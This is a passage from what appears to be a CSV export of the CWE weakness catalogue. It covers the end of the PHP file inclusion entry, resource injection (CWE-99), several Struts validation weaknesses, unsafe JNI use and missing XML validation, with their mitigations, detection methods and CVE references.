original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Architecture and Design Operation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls. Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:Develop and run your code in the most recent versions of PHP available, preferably PHP 6 or later. Many of the highly risky features in earlier PHP interpreters have been removed, restricted, or disabled by default.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues. Often, programmers do not protect direct access to files intended only to be included by core programs. These include files may assume that critical variables have already been initialized by the calling program. As a result, the use of register_globals combined with the ability to directly access the include file may allow attackers to conduct file inclusion attacks. This remains an extremely common pattern as of 2009.::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Set allow_url_fopen to false, which limits the ability to include files from remote locations.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2004-0285:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0285::REFERENCE:CVE-2004-0030:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0030::REFERENCE:CVE-2004-0068:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0068::REFERENCE:CVE-2005-2157:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2157::REFERENCE:CVE-2005-2162:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2162::REFERENCE:CVE-2005-2198:DESCRIPTION:Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2198::REFERENCE:CVE-2004-0128:DESCRIPTION:Modification of assumed-immutable variable in configuration script leads to file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0128::REFERENCE:CVE-2005-1864:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1864::REFERENCE:CVE-2005-1869:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1869::REFERENCE:CVE-2005-1870:DESCRIPTION:PHP file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1870::REFERENCE:CVE-2005-2154:DESCRIPTION:PHP local file inclusion.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2154::REFERENCE:CVE-2002-1704:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1704::REFERENCE:CVE-2002-1707:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1707::REFERENCE:CVE-2005-1964:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1964::REFERENCE:CVE-2005-1681:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1681::REFERENCE:CVE-2005-2086:DESCRIPTION:PHP remote file include.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2086::REFERENCE:CVE-2004-0127:DESCRIPTION:Directory traversal vulnerability in PHP include statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0127::REFERENCE:CVE-2005-1971:DESCRIPTION:Directory traversal vulnerability in PHP include statement.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1971::REFERENCE:CVE-2005-3335:DESCRIPTION:PHP file inclusion issue, both remote and local; local include uses .. and %00 characters as a manipulation, but many remote file inclusion issues probably have this vector.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3335::REFERENCE:CVE-2009-1936:DESCRIPTION:chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1936::\",,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:PHP File Include::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:WASC:ENTRY ID:5:ENTRY NAME:Remote File Inclusion::\",::193::,\"::TYPE:Relationship:NOTE:This is frequently a functional consequence of other weaknesses. It is usually multi-factor with other factors (e.g. MAID), although not all inclusion bugs involve assumed-immutable data. Direct request weaknesses frequently play a role. Can overlap directory traversal in local inclusion problems.::\",\n99,\"Improper Control of Resource Identifiers ('Resource Injection')\",Class,Draft,\"The product receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.\",\"A resource injection issue occurs when the following two conditions are met: An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server. This may enable an attacker to access or modify otherwise protected system resources.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:706:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:73:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Insecure Direct Object Reference:DESCRIPTION:OWASP uses this term, although it is effectively the same as resource injection.::\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:NOTE:An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, it can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::\",\"::REFERENCE:CVE-2013-4787:DESCRIPTION:chain: mobile OS verifies cryptographic signature of file in an archive, but then installs a different file with the same name that is also listed in the archive.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-4787::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Resource Injection::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-99::\",::10::240::75::,\"::TYPE:Relationship:NOTE:Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73).::TYPE:Maintenance:NOTE:The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 Resource Injection, as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the identifier used to access a system resource such as a file name or port number, yet it explicitly states that the resource injection term does not apply to path manipulation, which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer.::\",\n102,\"Struts: Duplicate Validation Forms\",Variant,Incomplete,\"The product uses multiple validation forms with the same name, which might cause the Struts Validator to validate a form that the programmer does not expect.\",\"If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations, possibly leading to resultant weaknesses. Moreover, it indicates that the validation logic is not up-to-date, and can indicate that other, more subtle validation errors are present.\",::NATURE:ChildOf:CWE ID:694:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1173:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"::PHASE:Implementation:DESCRIPTION:The DTD or schema validation will not catch the duplicate occurrence of the same form name. To find the issue in the implementation, manual checks or automated static analysis could be applied to the xml configuration files.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Duplicate Validation Forms::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n103,\"Struts: Incomplete validate() Method Definition\",Variant,Draft,\"The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().\",\"If the code does not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"::The Struts Validator uses a form's validate() method to check the contents of the form properties against the constraints specified in the associated validation form. That means the following classes have a validate() method that is part of the validation framework: ValidatorForm, ValidatorActionForm, DynaValidatorForm, and DynaValidatorActionForm. If the code creates a class that extends one of these classes, and if that class implements custom validation logic by overriding the validate() method, the code must call super.validate() in the validate() implementation.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other:NOTE:Disabling the validation framework for a form exposes the product to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Other:NOTE:Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Implement the validate() method and call super.validate() within that method.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Erroneous validate() Method::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"::TYPE:Relationship:NOTE:This could introduce other weaknesses related to missing input validation.::TYPE:Maintenance:NOTE:The current description implies a loose composite of two separate weaknesses, so this node might need to be split or converted into a low-level category.::\",\n104,\"Struts: Form Bean Does Not Extend Validation Class\",Variant,Draft,\"If a form bean does not extend an ActionForm subclass of the Validator framework, it can expose the application to other weaknesses related to insufficient input validation.\",\"\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"::In order to use the Struts Validator, a form must extend one of the following: ValidatorForm, ValidatorActionForm, DynaValidatorActionForm, and DynaValidatorForm. One of these classes must be extended because the Struts Validator ties in to the application by implementing the validate() method in these classes. Forms derived from the ActionForm and DynaActionForm classes cannot use the Struts Validator.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other:NOTE:Bypassing the validation framework for a form exposes the application to numerous types of attacks. Unchecked input is an important component of vulnerabilities like cross-site scripting, process control, and SQL injection.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Other:NOTE:Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Ensure that all forms extend one of the Validation Classes.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Form Bean Does Not Extend Validation Class::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n105,\"Struts: Form Field Without Validator\",Variant,Draft,\"The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.\",\"Omitting validation for even a single input field may give attackers the leeway they need to compromise the product. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.\",::NATURE:ChildOf:CWE ID:1173:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Some products use the same ActionForm for more than one purpose. In situations like this, some fields may go unused under some action mappings.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::SCOPE:Integrity:IMPACT:Bypass Protection Mechanism:NOTE:If unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Form Field Without Validator::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n106,\"Struts: Plug-in Framework not in Use\",Variant,Draft,\"When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.\",\"Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.\",::NATURE:ChildOf:CWE ID:1173:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Use an input validation framework such as Struts.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use an input validation framework such as Struts.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that: Phone number fields contain only valid characters in phone numbers Boolean values are only T or F Free-form strings are of a reasonable length and composition::PHASE:Implementation:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that: Phone number fields contain only valid characters in phone numbers Boolean values are only T or F Free-form strings are of a reasonable length and composition::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Plug-in Framework Not In Use::\",,\"\",\n107,\"Struts: Unused Validation Form\",Variant,Draft,\"An unused validation form indicates that validation logic is not up-to-date.\",\"It is easy for developers to forget to update validation logic when they remove or rename action form mappings. One indication that validation logic is not being properly maintained is the presence of an unused validation form.\",::NATURE:ChildOf:CWE ID:1164:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Remove the unused Validation Form from the validation.xml file.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Unused Validation Form::\",,\"\",\n108,\"Struts: Unvalidated Action Form\",Variant,Incomplete,\"Every Action Form must have a corresponding validation form.\",\"If a Struts Action Form Mapping specifies a form, it must have a validation form defined under the Struts Validator.\",::NATURE:ChildOf:CWE ID:1173:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other:NOTE:If an action form mapping does not have a validation form defined, it may be vulnerable to a number of attacks that rely on unchecked input. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Other:IMPACT:Other:NOTE:Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Map every Action Form to a corresponding validation form. An action or a form may perform validation in other ways, but the Struts Validator provides an excellent way to verify that all input receives at least a basic level of validation. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Unvalidated Action Form::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n109,\"Struts: Validator Turned Off\",Variant,Draft,\"Automatic filtering via a Struts bean has been turned off, which disables the Struts Validator and custom validation logic. This exposes the application to other weaknesses related to insufficient input validation.\",\"\",::NATURE:ChildOf:CWE ID:1173:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Ensure that an action form mapping enables validation. Set the validate field to true.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Validator Turned Off::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"::TYPE:Other:NOTE:The Action Form mapping in the demonstrative example disables the form's validate() method. The Struts bean: write tag automatically encodes special HTML characters, replacing a < with &lt; and a > with &gt;. This action can be disabled by specifying filter=false as an attribute of the tag to disable specified JSP pages. However, being disabled makes these pages susceptible to cross-site scripting attacks. An attacker may be able to insert malicious scripts as user input to write to these JSP pages.::\",\n110,\"Struts: Validator Without Form Field\",Variant,Draft,\"Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.\",\"It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.\",::NATURE:ChildOf:CWE ID:1164:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Other:IMPACT:Other:NOTE:It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.:EFFECTIVENESS:Moderate::METHOD:Manual Static Analysis:DESCRIPTION:To find the issue in the implementation, manual checks or automated static analysis could be applied to the XML configuration files.:EFFECTIVENESS:Moderate::\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Struts: Validator Without Form Field::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",,\"\",\n111,\"Direct Use of Unsafe JNI\",Variant,Draft,\"When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.\",\"Many safety features that programmers may take for granted do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.\",::NATURE:ChildOf:CWE ID:695:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Implement error handling around the JNI call.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:Do not use JNI calls if you don't trust the native library.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:Be reluctant to use JNI calls. A Java API equivalent may exist.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Unsafe JNI::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC08-J:ENTRY NAME:Define wrappers around native methods::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:JNI01-J:ENTRY NAME:Safely invoke standard APIs that perform tasks using the immediate caller's class loader instance (loadLibrary)::TAXONOMY NAME:SEI CERT Oracle Coding Standard for Java:ENTRY ID:JNI00-J:ENTRY NAME:Define wrappers around native methods:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::\",,\"\",\n112,\"Missing XML Validation\",Base,Draft,\"The product accepts XML from an untrusted source but does not validate the XML against the proper schema.\",\"Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.\",::NATURE:ChildOf:CWE ID:1286:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Unexpected State::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Input Validation:DESCRIPTION:Always validate XML input against a known XML Schema or DTD. It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Missing XML Validation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::\",::230::231::,\"\","
  }
}